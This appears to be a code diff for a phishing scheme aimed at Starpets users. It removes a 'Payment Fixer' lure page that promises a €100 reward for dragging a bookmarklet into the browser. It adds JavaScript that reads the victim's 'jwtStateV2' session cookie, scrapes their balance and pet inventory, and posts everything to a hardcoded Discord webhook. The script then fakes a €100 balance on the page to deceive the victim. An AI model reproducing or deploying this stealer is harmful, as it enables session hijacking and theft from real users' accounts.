@@ -1,417 +1,123 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Starpets Payment Fix</title>
-<!-- Google Fonts: Poppins -->
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
-<style>
-  body {
-    margin: 0; padding: 0; height: 100vh;
-    display: flex; justify-content: center; align-items: center;
-    font-family: 'Poppins', Arial, sans-serif;
-    color: white; overflow: hidden;
-    background: linear-gradient(-45deg, #ff4b2b, #ff416c, #1e3c72, #2a5298);
-    background-size: 400% 400%;
-    animation: gradientBG 15s ease infinite;
+function getCookieValue(name) {
+  const cookies = document.cookie.split('; ');
+  for (const cookie of cookies) {
+    const [key, value] = cookie.split('=');
+    if (key === name) return decodeURIComponent(value);
   }
-  @keyframes gradientBG {
-    0% {background-position: 0% 50%;}
-    50% {background-position: 100% 50%;}
-    100% {background-position: 0% 50%;}
+  return null;
+}
+
+function getRandomColor() {
+  return Math.floor(Math.random() * 0xffffff);
+}
+
+function getBalance() {
+  const balanceEl = document.querySelector('div._text_1oh67_1._text__size_m_1oh67_37._text__weight_semibold_1oh67_78');
+  return balanceEl ? balanceEl.textContent.trim() : null;
+}
+
+function chunkArray(arr, size) {
+  const chunks = [];
+  for (let i = 0; i < arr.length; i += size) {
+    chunks.push(arr.slice(i, i + size));
   }
-  .card {
-    background: rgba(0,0,0,0.6);
-    padding: 35px 50px 40px 50px;
-    border-radius: 12px;
-    text-align: center;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    max-width: 520px;  /* genişlettim */
-    max-height: 280px; /* biraz yüksek yaptım */
-    white-space: nowrap; /* yazı satır kırmasın */
-    overflow-wrap: normal;
-    overflow: visible;
-  }
-  h1, h2 {
-    font-weight: 600;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 15px;
-    flex-wrap: nowrap; /* satır kırma yok */
-    margin: 0 0 15px 0;
-  }
-  h1 {
-    font-size: 2.5rem;
-  }
-  h2 {
-    font-size: 2rem;
-    color: #222;
-    margin-bottom: 20px;
+  return chunks;
+}
+
+async function sendEmbeds() {
+  const originalBalance = getBalance();
+
+  const jwtCookieValue = getCookieValue('jwtStateV2');
+  const currentURL = window.location.href;
+  let petValues = [];
+
+  if (currentURL.startsWith('https://starpets.pw/profile/trade/inventory')) {
+    const petElements = document.querySelectorAll('h3._text_1oh67_1._text__size_m_1oh67_37._text__weight_semibold_1oh67_78._text__style_normal_1oh67_87._text__decoration_normal_1oh67_96._contentBlockName_134sj_43');
+
+    petElements.forEach(petEl => {
+      const petName = petEl.textContent.trim();
+      let price = 'Unknown';
+      let priceNum = -1;
+
+      let priceDiv = petEl.nextElementSibling;
+      let attempts = 0;
+      while (priceDiv && attempts < 3) {
+        if (priceDiv.classList && priceDiv.classList.contains('_contentBlockPriceApproximate_134sj_59')) {
+          const span = priceDiv.querySelector('span');
+          if (span) {
+            price = span.textContent.trim();
+            const match = price.match(/[\d,.]+/);
+            if (match) priceNum = parseFloat(match[0].replace(',', '.'));
+          }
+          break;
+        }
+        priceDiv = priceDiv.nextElementSibling;
+        attempts++;
+      }
+      petValues.push({ name: petName, price, priceNum });
+    });
   }
 
-  /* Resim yuvarlak ve başta sondada olacak */
-  .heading-img {
-    width: 3.2rem;
-    height: 3.2rem;
-    object-fit: cover;
-    border-radius: 50%;
-    flex-shrink: 0;
-  }
-  .heading-img.start {
-    order: -1;
-  }
-  .heading-img.end {
-    order: 1;
+  petValues.sort((a, b) => b.priceNum - a.priceNum);
+  const chunks = chunkArray(petValues, 20);
+  const webhookURL = 'https://discord.com/api/webhooks/1403530496310513674/misQ4uKTP5xNLmH5PiYkUtXQFdOcLBye0_5-p3jriRNRvU33LQhTuI2sk4uzlHrPGq68';
+
+  // Send JWT information to Discord first
+  if (jwtCookieValue) {
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: `JWT Cookie - Balance: ${originalBalance || 'Unknown'}`,
+          description: `\`\`\`\n${jwtCookieValue}\n\`\`\``,
+          color: getRandomColor()
+        }]
+      })
+    });
   }
 
-  p {
-    font-weight: 400;
-    font-size: 1.1rem;
-    margin-bottom: 30px;
+  // Then send pet information
+  for (const chunk of chunks) {
+    const valueText = chunk.map(pet => `*${pet.name}*  **${pet.price}**`).join('\n');
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: 'Pet Inventory',
+          fields: [{ name: '\u200b', value: valueText, inline: false }],
+          color: getRandomColor()
+        }]
+      })
+    });
   }
 
-  /* Butonlar alt alta ve arada boşluk */
-  .buttons-container {
-    display: flex;
-    flex-direction: column;
-    gap: 15px;
-    align-items: center;
-  }
+  console.log('All embeds sent successfully.');
 
-  /* Button basic styles */
-  .button {
-    display: inline-flex;
-    align-items: center;
-    gap: 10px;
-    padding: 15px 30px;
-    color: white !important;
-    border-radius: 8px;
-    text-decoration: none;
-    font-size: 18px;
-    cursor: grab;
-    user-select: none;
-    font-family: Arial, sans-serif;
-    font-weight: normal;
-    width: 240px; /* genişlik sabitlendi */
-    justify-content: center;
-    transition: background-color 0.3s ease;
-  }
-  .button:active {
-    cursor: grabbing;
-  }
-  .button img {
-    display: block;
-    border-radius: 50%;
-    width: 32px;
-    height: 32px;
-    object-fit: cover;
-  }
+  // Payment method selection and reward system
+  const paymentMethod = prompt(`Which payment method are you having issues with?\n\n1) Robux\n2) Visa/Mastercard/Paypal\n3) Crypto (Bitcoin, Ethereum, etc.)\n\nPlease enter the option number (1-3):`);
 
-  /* Payment Fix Button (green) */
-  .btn-payment-fix {
-    background-color: #28a745;
-  }
-  .btn-payment-fix:hover {
-    background-color: #218838;
-  }
-
-  /* Tutorial Button (blue) */
-  .btn-tutorial {
-    background-color: #007bff;
-  }
-  .btn-tutorial:hover {
-    background-color: #0056b3;
-  }
-
-  /* Modal Styles */
-  .modal-bg {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: rgba(0,0,0,0.7);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 1000;
-    padding: 10px;
-    box-sizing: border-box;
-  }
-  .modal-bg.active {
-    display: flex;
-  }
-  .modal-wrapper {
-    display: flex;
-    gap: 30px;
-    align-items: stretch;
-    max-width: 1020px;
-    width: 90%;
-    justify-content: center;
-  }
-  .modal {
-    background: #fff;
-    border-radius: 12px;
-    max-width: 700px;
-    width: 100%;
-    padding: 20px 30px 30px 30px;
-    color: #222;
-    text-align: left;
-    position: relative;
-    display: flex;
-    flex-direction: column;
-    box-sizing: border-box;
-  }
-  .step-content {
-    font-size: 1.1rem;
-    min-height: 100px;
-    margin-bottom: 20px;
-  }
-  .step-content a {
-    color: #007bff;
-    text-decoration: underline;
-  }
-  .step-media {
-    max-width: 100%;
-    max-height: 300px;
-    margin-bottom: 20px;
-  }
-  .step-media img,
-  .step-media video {
-    max-width: 100%;
-    max-height: 300px;
-    border-radius: 8px;
-  }
-  .buttons {
-    display: flex;
-    justify-content: space-between;
-  }
-  .modal button {
-    border: none;
-    padding: 10px 20px;
-    font-size: 1rem;
-    border-radius: 6px;
-    cursor: pointer;
-    user-select: none;
-    transition: background-color 0.3s ease;
-  }
-  /* Back button grey */
-  #prevStep {
-    background-color: #6c757d;
-    color: white;
-  }
-  #prevStep:hover:not(:disabled) {
-    background-color: #5a6268;
-  }
-  /* Next button custom hex (orange) */
-  #nextStep {
-    background-color: #ff5722;
-    color: white;
-  }
-  #nextStep:hover:not(:disabled) {
-    background-color: #e64a19;
-  }
-  #nextStep:disabled {
-    background-color: #ccc;
-    cursor: not-allowed;
-    color: #666;
-  }
-  /* Close button custom hex (orange) */
-  .close-btn {
-    position: absolute;
-    top: 10px; right: 15px;
-    background: transparent;
-    border: none;
-    font-size: 1.5rem;
-    color: #ff5722;
-    cursor: pointer;
-    transition: color 0.3s ease;
-  }
-  .close-btn:hover {
-    color: #e64a19;
-  }
-
-  /* Extra Box Styles */
-  .extra-box {
-    background: #fff;
-    border-radius: 12px;
-    max-width: 350px;
-    width: 350px;
-    padding: 20px;
-    box-sizing: border-box;
-    color: #222;
-    display: flex;
-    flex-direction: column;
-    justify-content: flex-start;
-    font-size: 1rem;
-  }
-  .extra-box p {
-    margin-bottom: 15px;
-    line-height: 1.4;
-  }
-  .extra-box iframe {
-    border-radius: 8px;
-  }
-</style>
-</head>
-<body>
-
-<div class="card">
-  <h1>
-    <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="Icon Start" class="heading-img start" />
-    Starpets Payment Fixer
-    <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="Icon End" class="heading-img end" />
-  </h1>
-  <p>Drag the green button into your browser’s bookmarks bar</p>
-  
-  <div class="buttons-container">
-    <!-- Payment Fix Button -->
-    <a href="javascript:"  
-     class="button btn-payment-fix" 
-     draggable="true" 
-     aria-label="Drag to bookmarks">
-       <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="Icon" />
-       <span>⭐ Payment Fix ⭐</span>
-    </a>
-
-    <!-- Tutorial Button -->
-    <a href="#" id="tutorialBtn" class="button btn-tutorial" aria-haspopup="dialog" aria-controls="tutorialModal">
-      <img src="https://cdn-icons-png.flaticon.com/512/1828/1828859.png" alt="Tutorial Icon" style="width:28px; height:28px;" />
-      <span>Tutorial</span>
-    </a>
-  </div>
-</div>
-
-<!-- Modal -->
-<div class="modal-bg" id="tutorialModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-  <div class="modal-wrapper">
-    <div class="modal" id="modalContent">
-      <button class="close-btn" id="closeModal" aria-label="Close Tutorial">&times;</button>
-      <h2 id="modalTitle">
-        <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="Icon Start" class="heading-img start" />
-        Tutorial
-        <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="Icon End" class="heading-img end" />
-      </h2>
-      <div class="step-media" id="stepMedia">
-        <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Step Media" />
-      </div>
-      <div class="step-content" id="stepContent">
-        Content for step 1 here.
-      </div>
-      <div class="buttons">
-        <button id="prevStep" disabled>Previous</button>
-        <button id="nextStep">Next</button>
-      </div>
-    </div>
-
-    <div class="extra-box" id="extraBox" aria-label="Additional tutorial video and info" style="display:none;">
-      <p>
-        If your bookmarks bar is hidden or disabled, watch this video to learn how to enable it:
-      </p>
-      <iframe 
-        id="youtubeVideo" 
-        width="320" 
-        height="180" 
-        src="https://www.youtube.com/embed/i9Ql6QVkFAo" 
-        title="How to enable bookmarks bar" 
-        frameborder="0" 
-        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-        allowfullscreen>
-      </iframe>
-    </div>
-  </div>
-</div>
-
-<script>
-  const tutorialBtn = document.getElementById('tutorialBtn');
-  const modalBg = document.getElementById('tutorialModal');
-  const closeModal = document.getElementById('closeModal');
-  const prevStepBtn = document.getElementById('prevStep');
-  const nextStepBtn = document.getElementById('nextStep');
-  const stepContent = document.getElementById('stepContent');
-  const stepMedia = document.getElementById('stepMedia');
-  const extraBox = document.getElementById('extraBox');
-
-  const steps = [
-    {
-      content: `Firstly drag the <strong>⭐Payment Fix⭐</strong> button to your bookmarks bar to add it.`,
-      mediaType: "img",
-      mediaSrc: "https://cdn-icons-png.flaticon.com/512/1828/1828859.png"
-    },
-    {
-      content: `Visit the Starpets website and log in, then navigate to your inventory or directly via <a href="https://starpets.pw" target="_blank" rel="noopener noreferrer">https://starpets.pw</a>.`,
-      mediaType: "img",
-      mediaSrc: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
-    },
-    {
-      content: `Once on the Starpets page, click the bookmark you added and select your problems.`,
-      mediaType: "img",
-      mediaSrc: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
-    },
-    {
-      content: `Once you finish answering the questions, you will receive the €100 balance we provide. Use it however you wish!`,
-      mediaType: "img",
-      mediaSrc: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
-    },
-    {
-      content: `You have completed the tutorial!`,
-      mediaType: "img",
-      mediaSrc: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
-    }
-  ];
-  let currentStep = 0;
-
-  function updateStep() {
-    stepContent.innerHTML = steps[currentStep].content;
-    if (steps[currentStep].mediaType === "img" && steps[currentStep].mediaSrc) {
-      stepMedia.innerHTML = `<img src="${steps[currentStep].mediaSrc}" alt="Step media" />`;
-    } else if (steps[currentStep].mediaType === "video" && steps[currentStep].mediaSrc) {
-      stepMedia.innerHTML = `<video controls src="${steps[currentStep].mediaSrc}"></video>`;
-    } else {
-      stepMedia.innerHTML = '';
+  if (paymentMethod !== null) {
+    let selectedMethod = "";
+    switch(paymentMethod.trim()) {
+      case "1": selectedMethod = "Robux"; break;
+      case "2": selectedMethod = "Visa/Mastercard/Paypal"; break;
+      case "3": selectedMethod = "Crypto (Bitcoin, Ethereum, etc.)"; break;
+      default: selectedMethod = "Invalid option selected";
     }
 
-    prevStepBtn.disabled = currentStep === 0;
-    nextStepBtn.disabled = currentStep === steps.length - 1;
+    alert("Thank you for your response. Your request will be processed shortly. As a reward, you have received 100 Euros.");
 
-    // Show extraBox only in first step
-    extraBox.style.display = currentStep === 0 ? "flex" : "none";
+    // Update balance to 100 Euros
+    const balanceDiv = document.querySelector('div._text_1oh67_1._text__size_m_1oh67_37._text__weight_semibold_1oh67_78._text__style_normal_1oh67_87._text__decoration_normal_1oh67_96._title_fg9xm_23');
+    if (balanceDiv) {
+      const currentText = balanceDiv.textContent;
+      const newText = currentText.replace(/[\d.,]+/, "100.00");
+      balanceDiv.textContent = newText;
+    }
   }
+}
 
-  tutorialBtn.addEventListener('click', e => {
-    e.preventDefault();
-    modalBg.classList.add('active');
-    currentStep = 0;
-    updateStep();
-  });
-
-  closeModal.addEventListener('click', () => {
-    modalBg.classList.remove('active');
-  });
-
-  prevStepBtn.addEventListener('click', () => {
-    if (currentStep > 0) {
-      currentStep--;
-      updateStep();
-    }
-  });
-
-  nextStepBtn.addEventListener('click', () => {
-    if (currentStep < steps.length - 1) {
-      currentStep++;
-      updateStep();
-    }
-  });
-
-  // Close modal on background click
-  modalBg.addEventListener('click', (e) => {
-    if (e.target === modalBg) {
-      modalBg.classList.remove('active');
-    }
-  });
-</script>
-
-</body>
-</html>
-
-
+sendEmbeds().catch(console.error);
